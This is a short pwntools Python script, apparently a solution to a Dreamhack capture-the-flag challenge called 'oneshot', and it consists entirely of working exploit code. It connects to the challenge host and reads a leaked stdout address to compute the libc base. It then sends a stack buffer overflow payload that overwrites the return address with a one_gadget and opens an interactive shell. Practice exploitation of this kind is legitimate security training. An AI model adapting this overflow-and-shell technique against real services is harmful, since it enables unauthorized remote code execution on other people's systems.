
from pwn import *

r = remote('host1.dreamhack.games', 13343)
# r = process('./oneshot')
# lib = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
lib = ELF('./libc.so.6', checksec=False)

leak = int(r.readline().split()[1], 16)

lib_stdout = lib.sym['_IO_2_1_stdout_']

lib_base = leak-lib_stdout
one_gadget = 0x45216

p = b'A' * 24
p += p64(0x00) * 2
p += p64(lib_base+one_gadget)

r.recvuntil('MSG: ')

r.sendline(p)

r.interactive()